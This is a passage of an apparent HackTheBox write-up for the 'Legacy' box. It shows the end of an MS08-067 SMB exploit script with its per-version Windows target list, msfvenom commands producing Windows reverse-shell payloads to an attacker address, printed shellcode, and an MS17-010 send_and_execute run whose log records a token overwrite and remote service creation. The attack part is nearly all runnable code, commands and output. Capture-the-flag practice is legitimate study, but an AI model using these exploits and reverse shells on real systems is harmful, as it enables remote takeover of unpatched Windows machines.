        server = &quot;\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00&quot;
        prefix = &quot;\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00&quot;
        
        # NEW HOTNESS
        # The Path Length and the &quot;Actual Count&quot; SMB parameter have to match.  Path length in bytes
        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
        #   store hex values in reverse byte order.  So: 36 01 00 00  =&gt; 00 00 01 36 =&gt; 310.  No idea why it's &quot;doubled&quot;
        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
        MaxCount = &quot;\x36\x01\x00\x00&quot;  # Decimal 310. =&gt; Path length of 620.
        Offset = &quot;\x00\x00\x00\x00&quot;
        ActualCount = &quot;\x36\x01\x00\x00&quot; # Decimal 310. =&gt; Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + &quot;\xE8\x03\x00\x00&quot; + prefix + &quot;\x01\x10\x00\x00\x00\x00\x00\x00&quot;        

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print 'Exploit finish\n'

if __name__ == '__main__':
       try:
           target = sys.argv[1]
           os = sys.argv[2]
           port = sys.argv[3]
       except IndexError:
                print '\nUsage: %s &lt;target ip&gt; &lt;os #&gt; &lt;Port #&gt;\n' % sys.argv[0]
                print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
                print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
                print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
                print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
                print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
                print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
                print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
                print ''
                print 'FYI: nmap has a good OS discovery script that pairs well with this exploit:'
                print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1'
                print ''
                sys.exit(-1)


current = SRVSVC_Exploit(target, os, port)
current.start()
</code></pre>

<p>MSFVENOM</p>

<p><a href="https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-08-067">https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-08-067</a></p>

<pre><code> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f py -v shellcode -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1872 bytes
shellcode =  &quot;&quot;
shellcode += &quot;\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e&quot;
shellcode += &quot;\x81\x76\x0e\xae\xf1\xdb\xb3\x83\xee\xfc\xe2\xf4&quot;
shellcode += &quot;\x52\x19\x59\xb3\xae\xf1\xbb\x3a\x4b\xc0\x1b\xd7&quot;
shellcode += &quot;\x25\xa1\xeb\x38\xfc\xfd\x50\xe1\xba\x7a\xa9\x9b&quot;
shellcode += &quot;\xa1\x46\x91\x95\x9f\x0e\x77\x8f\xcf\x8d\xd9\x9f&quot;
shellcode += &quot;\x8e\x30\x14\xbe\xaf\x36\x39\x41\xfc\xa6\x50\xe1&quot;
shellcode += &quot;\xbe\x7a\x91\x8f\x25\xbd\xca\xcb\x4d\xb9\xda\x62&quot;
shellcode += &quot;\xff\x7a\x82\x93\xaf\x22\x50\xfa\xb6\x12\xe1\xfa&quot;
shellcode += &quot;\x25\xc5\x50\xb2\x78\xc0\x24\x1f\x6f\x3e\xd6\xb2&quot;
shellcode += &quot;\x69\xc9\x3b\xc6\x58\xf2\xa6\x4b\x95\x8c\xff\xc6&quot;
shellcode += &quot;\x4a\xa9\x50\xeb\x8a\xf0\x08\xd5\x25\xfd\x90\x38&quot;
shellcode += &quot;\xf6\xed\xda\x60\x25\xf5\x50\xb2\x7e\x78\x9f\x97&quot;
shellcode += &quot;\x8a\xaa\x80\xd2\xf7\xab\x8a\x4c\x4e\xae\x84\xe9&quot;
shellcode += &quot;\x25\xe3\x30\x3e\xf3\x99\xe8\x81\xae\xf1\xb3\xc4&quot;
shellcode += &quot;\xdd\xc3\x84\xe7\xc6\xbd\xac\x95\xa9\x0e\x0e\x0b&quot;
shellcode += &quot;\x3e\xf0\xdb\xb3\x87\x35\x8f\xe3\xc6\xd8\x5b\xd8&quot;
shellcode += &quot;\xae\x0e\x0e\xe3\xfe\xa1\x8b\xf3\xfe\xb1\x8b\xdb&quot;
shellcode += &quot;\x44\xfe\x04\x53\x51\x24\x4c\xd9\xab\x99\xd1\xb9&quot;
shellcode += &quot;\xa0\xff\xb3\xb1\xae\xf0\x60\x3a\x48\x9b\xcb\xe5&quot;
shellcode += &quot;\xf9\x99\x42\x16\xda\x90\x24\x66\x2b\x31\xaf\xbf&quot;
shellcode += &quot;\x51\xbf\xd3\xc6\x42\x99\x2b\x06\x0c\xa7\x24\x66&quot;
shellcode += &quot;\xc6\x92\xb6\xd7\xae\x78\x38\xe4\xf9\xa6\xea\x45&quot;
shellcode += &quot;\xc4\xe3\x82\xe5\x4c\x0c\xbd\x74\xea\xd5\xe7\xb2&quot;
shellcode += &quot;\xaf\x7c\x9f\x97\xbe\x37\xdb\xf7\xfa\xa1\x8d\xe5&quot;
shellcode += &quot;\xf8\xb7\x8d\xfd\xf8\xa7\x88\xe5\xc6\x88\x17\x8c&quot;
shellcode += &quot;\x28\x0e\x0e\x3a\x4e\xbf\x8d\xf5\x51\xc1\xb3\xbb&quot;
shellcode += &quot;\x29\xec\xbb\x4c\x7b\x4a\x3b\xae\x84\xfb\xb3\x15&quot;
shellcode += &quot;\x3b\x4c\x46\x4c\x7b\xcd\xdd\xcf\xa4\x71\x20\x53&quot;
shellcode += &quot;\xdb\xf4\x60\xf4\xbd\x83\xb4\xd9\xae\xa2\x24\x66&quot;

</code></pre>

<p>windows support versions</p>

<pre><code>Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
</code></pre>

<p>edited with vi q@a</p>

<pre><code>Windows XP SP0/SP1 Universal, port 445
Windows 2000 Universal, port 139 (445 could also be used)
Windows 2003 SP0 Universal
Windows 2003 SP1 English
Windows XP SP3 French (NX)
Windows XP SP3 English (NX)
Windows XP SP3 English (AlwaysOn NX)
</code></pre>

<pre><code>git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
cd impacket
pip install .
</code></pre>

<pre><code>python ms08-067.py 10.10.10.4 6 445
nc -lvnp 443
</code></pre>

<p>MS-17-010</p>

<p>clone the rep then run everything inside the repo so the python has access to the mysqm module.</p>

<pre><code>https://github.com/helviojunior/MS17-010.git
</code></pre>

<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.14_443.exe
</code></pre>

<pre><code>python send_and_execute.py 10.10.10.4 rev_10.10.14.14_443.exe                         
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward                                                                
leak next transaction
CONNECTION: 0x821f9638
SESSION: 0xe1ee5c18
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1f45b50
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1f45bf0
overwriting token UserAndGroups
Sending file BURVZM.exe...
Opening SVCManager on 10.10.10.4.....
Creating service jOGJ.....
Starting service jOGJ.....
The NETBIOS connection with the remote host timed out.
Removing service jOGJ.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done

</code></pre>



    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/hackthebox/boxes/devel/" title="Devel"> <i class="fa fa-chevron-left"></i><label>Devel</label></a>
    <a class="nav nav-next" href="/hackthebox/boxes/mischief/" title="Mischief" style="margin-right: 0px;"><label>Mischief</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    

    

    

    
    <div class="github-link">
      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/Legacy/_index.md" target="blank"><i class="fa fa-code-fork"></i>
        Improve this page</a>
    </div>
    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/js/clipboard.min.js"></script>

<link href="/css/featherlight.min.css" rel="stylesheet">
<script src="/js/featherlight.min.js"></script>



<script src="/theme-flex/script.js"></script>


    

    
    

    
  </body>
</html>